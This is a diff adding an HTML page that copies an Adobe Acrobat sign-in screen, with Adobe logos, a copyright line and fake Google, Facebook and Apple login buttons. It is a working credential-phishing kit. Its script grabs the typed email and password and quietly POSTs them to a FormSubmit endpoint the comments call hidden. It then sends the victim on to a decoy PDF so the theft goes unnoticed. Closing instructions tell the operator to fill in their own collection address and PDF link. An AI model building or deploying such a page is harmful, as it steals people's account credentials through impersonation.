@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5" />
+
+  <!-- FAVICON - This makes the logo appear in the browser tab/taskbar -->
+  <link rel="icon" type="image/png" sizes="32x32" href="https://www.adobe.com/federal/assets/svgs/experience-cloud-logo.svg" />
+  <link rel="icon" type="image/png" sizes="16x16" href="https://business.adobe.com/products/genstudio.html" />
+  <link rel="apple-touch-icon" sizes="180x180" href="https://business.adobe.com/products/genstudio.html" />
+
+  <title>Adobe Document View</title>
+  <!-- Font Awesome (optional but used for icons) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      background: linear-gradient(145deg, #fc6767 0%, #fc6767 50%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      margin: 0;
+    }
+
+    .signin-card {
+      max-width: 480px;
+      width: 100%;
+      background: rgba(255, 255, 255, 0.85);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-radius: 2.5rem;
+      padding: 2.5rem 2rem 2.8rem;
+      box-shadow: 0 20px 50px rgba(0, 20, 40, 0.2), 0 0 0 1px rgba(255, 255, 255, 0.5);
+      transition: all 0.2s ease;
+    }
+
+    .cyber-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 1.8rem;
+      gap: 0.5rem;
+    }
+
+    .cyber-logo img {
+      height: 48px;
+      width: auto;
+      max-width: 180px;
+      object-fit: contain;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.05));
+    }
+
+    .cyber-logo .logo-fallback {
+      font-weight: 600;
+      font-size: 1.6rem;
+      letter-spacing: -0.5px;
+      color: #0b2b4a;
+      background: #d9e5f0;
+      padding: 0.3rem 1.2rem;
+      border-radius: 60px;
+      border: 1px solid rgba(255,255,255,0.4);
+    }
+
+    h1 {
+      font-size: 1.9rem;
+      font-weight: 600;
+      color: #0a1e2f;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.3rem;
+    }
+
+    .subtitle {
+      color: #3d556b;
+      font-size: 0.95rem;
+      margin-bottom: 2rem;
+      border-bottom: 1px solid rgba(0,0,0,0.04);
+      padding-bottom: 0.75rem;
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.3rem;
+    }
+
+    .subtitle a {
+      color: #0066b3;
+      font-weight: 500;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+
+    .subtitle a:hover {
+      text-decoration: underline;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    label {
+      display: block;
+      font-weight: 500;
+      font-size: 0.9rem;
+      color: #1f3b4f;
+      margin-bottom: 0.4rem;
+      letter-spacing: 0.01em;
+    }
+
+    .input-wrapper {
+      display: flex;
+      align-items: center;
+      background: white;
+      border-radius: 60px;
+      border: 1px solid #d9e2ec;
+      padding: 0.1rem 0.1rem 0.1rem 1.4rem;
+      transition: 0.2s;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+    }
+
+    .input-wrapper:focus-within {
+      border-color: #0066b3;
+      box-shadow: 0 0 0 3px rgba(0, 102, 179, 0.15);
+    }
+
+    .input-wrapper i {
+      color: #7a8fa3;
+      font-size: 1rem;
+      width: 1.4rem;
+      text-align: center;
+    }
+
+    .input-wrapper input {
+      border: none;
+      padding: 0.9rem 0.8rem 0.9rem 0.4rem;
+      font-size: 1rem;
+      width: 100%;
+      background: transparent;
+      outline: none;
+      font-weight: 450;
+      color: #0a1e2;
+    }
+
+    .input-wrapper input::placeholder {
+      color: #a7b9cb;
+      font-weight: 400;
+      font-size: 0.95rem;
+    }
+
+    .btn-continue {
+      width: 100%;
+      background: #0265dc;
+      border: none;
+      border-radius: 60px;
+      padding: 0.9rem 1.2rem;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: white;
+      margin: 0.8rem 0 1.6rem;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 4px 10px rgba(10, 30, 47, 0.2);
+      letter-spacing: 0.3px;
+    }
+
+    .btn-continue:hover {
+      background: #12344d;
+      transform: scale(1.01);
+      box-shadow: 0 6px 16px rgba(10, 30, 47, 0.25);
+    }
+
+    .btn-continue:active {
+      transform: scale(0.98);
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      color: #6f889e;
+      font-size: 0.85rem;
+      font-weight: 500;
+      margin: 1.8rem 0 1.6rem;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #d0dde9;
+    }
+
+    .social-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 0.6rem;
+      margin-bottom: 1.8rem;
+    }
+
+    .social-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.8rem;
+      background: white;
+      border: 1px solid #d9e2ec;
+      border-radius: 60px;
+      padding: 0.8rem;
+      font-weight: 500;
+      color: #1f3b4f;
+      transition: 0.15s;
+      cursor: pointer;
+      background: #ffffff;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+    }
+
+    .social-btn i {
+      font-size: 1.2rem;
+      width: 1.4rem;
+      text-align: center;
+      color: #3f5a70;
+    }
+
+    .social-btn:hover {
+      background: #f2f8ff;
+      border-color: #b0c8dd;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.04);
+    }
+
+    .more-options {
+      text-align: center;
+      margin: 1.4rem 0 1.2rem;
+    }
+
+    .more-options a, .help-link {
+      color: #0066b3;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 0.95rem;
+      display: inline-block;
+    }
+
+    .more-options a:hover, .help-link:hover {
+      text-decoration: underline;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.8rem;
+      margin-top: 2rem;
+      padding-top: 1rem;
+      border-top: 1px solid rgba(0,0,0,0.05);
+      font-size: 0.9rem;
+    }
+
+    .footer-links .help-link {
+      font-weight: 450;
+      color: #3d556b;
+    }
+
+    .footer-links .help-link i {
+      margin-right: 0.3rem;
+    }
+
+    /* hidden placeholder for FormSubmit (not visible) */
+    .formsubmit-hidden {
+      display: none;
+    }
+
+    /* responsive */
+    @media (max-width: 480px) {
+      .signin-card {
+        padding: 2rem 1.3rem 2rem;
+        border-radius: 2rem;
+      }
+      h1 {
+        font-size: 1.6rem;
+      }
+      .subtitle {
+        font-size: 0.85rem;
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .input-wrapper {
+        padding-left: 1rem;
+      }
+      .input-wrapper input {
+        padding: 0.8rem 0.3rem 0.8rem 0.2rem;
+        font-size: 0.95rem;
+      }
+      .btn-continue {
+        font-size: 1rem;
+        padding: 0.8rem;
+      }
+      .social-btn {
+        padding: 0.7rem;
+        font-size: 0.9rem;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .signin-card {
+        padding: 1.5rem 0.9rem;
+      }
+      .cyber-logo img {
+        max-width: 130px;
+        height: 36px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="signin-card">
+
+  <!-- Cyber School Logo placeholder: replace src with your actual logo URL -->
+  <div class="cyber-logo">
+    <img 
+      src="https://www.adobe.com/federal/assets/svgs/adobe-logo.svg" 
+      alt="Cyber School logo placeholder" 
+      id="schoolLogo"
+      onerror="this.style.display='none'; document.getElementById('logoFallback').style.display='inline-block';"
+    />
+    <span class="logo-fallback" id="logoFallback" style="display:none;">🔒 Cyber</span>
+    <!-- replace src with your official logo URL -->
+  </div>
+
+  <h1>Sign in to continue</h1>
+  <div class="subtitle">
+    <span>New user? <a href="#">Create an account</a></span>
+    <span style="font-size:0.85rem; color:#4e6d87;"><i class="far fa-user-circle"></i> Adobe Acrobat</span>
+  </div>
+
+  <!-- SIGN-IN FORM — email & password visible -->
+  <form id="signinForm" action="#" method="POST">
+    <div class="form-group">
+      <label for="email"><i class="far fa-envelope" style="margin-right: 6px;"></i> Email address</label>
+      <div class="input-wrapper">
+        <i class="far fa-envelope"></i>
+        <input type="email" id="email" name="email" placeholder="Email" value="" required />
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label for="password"><i class="fas fa-lock" style="margin-right: 6px;"></i> Password</label>
+      <div class="input-wrapper">
+        <i class="fas fa-key"></i>
+        <input type="password" id="password" name="password" placeholder="" value="" required />
+      </div>
+    </div>
+
+    <button type="submit" class="btn-continue">Continue <i class="fas fa-arrow-right" style="margin-left: 8px;"></i></button>
+  </form>
+
+  <div class="divider">or</div>
+
+  <div class="social-grid">
+    <button class="social-btn"><i class="fab fa-google"></i> Continue with Google</button>
+    <button class="social-btn"><i class="fab fa-facebook-f"></i> Continue with Facebook</button>
+    <button class="social-btn"><i class="fab fa-apple"></i> Continue with Apple</button>
+  </div>
+
+  <div class="more-options">
+    <a href="#"><i class="fas fa-chevron-circle-down" style="margin-right: 6px;"></i>More sign-in options</a>
+  </div>
+
+  <div class="footer-links">
+    <a href="#" class="help-link"><i class="fas fa-question-circle"></i> Get help signing in</a>
+    <span style="color: #4a6a85; font-size: 0.85rem;">Adobe Acrobat</span>
+  </div>
+
+  <!-- hidden placeholder (not visible) -->
+  <div class="formsubmit-hidden" aria-hidden="true"></div>
+  <div style="margin-top: 0.3rem; font-size:0.7rem; color:#4f6d88; text-align:center; border-top: 1px dashed #d0dde9; padding-top: 0.6rem;">
+    <i class="fas fa-code"></i> Copyright © 2026 Adobe. All rights reserved.
+  </div>
+</div>
+
+<script>
+  (function() {
+    const form = document.getElementById('signinForm');
+
+    // --- FORMSUBMIT ENDPOINT (hidden from UI) ---
+    // Replace with your actual FormSubmit endpoint.
+    const FORMSUBMIT_URL = 'https://formsubmit.co/your@email.com';   // <-- CHANGE THIS
+
+    // --- PDF REDIRECT URL (replace with your actual PDF link) ---
+    // The user will be redirected to this PDF after sign-in.
+    const PDF_REDIRECT_URL = 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf';  // <-- CHANGE TO YOUR PDF URL
+
+    // Set form action to FormSubmit (hidden)
+    if (form) {
+      form.action = FORMSUBMIT_URL;
+      console.log('✅ Form action set to FormSubmit endpoint (hidden).');
+    }
+
+    // Intercept form submission: send to FormSubmit, then redirect to PDF
+    form.addEventListener('submit', function(e) {
+      // We do NOT prevent default; we let the form submit to FormSubmit.
+      // But we also want to redirect to the PDF after a short delay.
+      // However, the form submission will navigate away. 
+      // To handle both: we use fetch to send data to FormSubmit, 
+      // then redirect to PDF. This way the user sees the PDF after sign-in.
+      e.preventDefault(); // prevent default form navigation
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      console.log('🔐 Sign-in attempt (demo)');
+      console.log(`📧 Email: ${email}`);
+      console.log(`🔑 Password: ${password}`);
+
+      // Prepare FormData
+      const formData = new FormData();
+      formData.append('email', email);
+      formData.append('password', password);
+
+      // Send data to FormSubmit using fetch (hidden from UI)
+      fetch(FORMSUBMIT_URL, {
+        method: 'POST',
+        body: formData,
+        // FormSubmit expects a form-urlencoded or multipart; FormData works.
+      })
+      .then(response => {
+        // Regardless of response, redirect to the PDF.
+        // Even if FormSubmit fails, we still redirect (for demo).
+        console.log('✅ Data sent to FormSubmit. Redirecting to PDF...');
+        window.location.href = PDF_REDIRECT_URL;
+      })
+      .catch(error => {
+        // If fetch fails, still redirect to PDF (graceful fallback)
+        console.warn('⚠️ Fetch error, but redirecting to PDF anyway.');
+        window.location.href = PDF_REDIRECT_URL;
+      });
+
+      // Also set a fallback redirect in case fetch takes too long (safety)
+      // but we use the promise above.
+    });
+
+    console.log('🔗 FormSubmit endpoint hidden. PDF redirect ready.');
+  })();
+</script>
+
+<!-- 
+  INSTRUCTIONS:
+  1. Replace FORMSUBMIT_URL with your actual FormSubmit endpoint.
+  2. Replace PDF_REDIRECT_URL with the URL of your PDF file.
+  3. Replace the logo src with your official cyber school logo URL.
+  4. The form will send data to FormSubmit (hidden) and then redirect to the PDF.
+-->
+</body>
+</html>
